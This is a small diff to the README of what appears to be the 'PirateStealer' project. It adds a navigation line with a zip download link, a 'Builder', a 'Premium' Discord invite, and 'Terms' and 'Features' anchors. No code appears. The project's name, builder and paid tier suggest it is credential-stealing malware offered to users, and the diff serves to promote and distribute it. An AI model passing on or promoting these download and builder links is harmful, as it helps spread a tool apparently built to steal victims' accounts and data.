@@ -1,4 +1,4 @@
-## [Premium](https://discord.gg/9KhkepxNR8) 
+### [Download](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/archive/refs/heads/main.zip) - [Builder](https://discord.gg/9KhkepxNR8)- [Premium](https://discord.gg/9KhkepxNR8) - [Terms](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/#terms) - [Features](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/#features)
 
 # PirateStealer
 Official PirateStealer repos
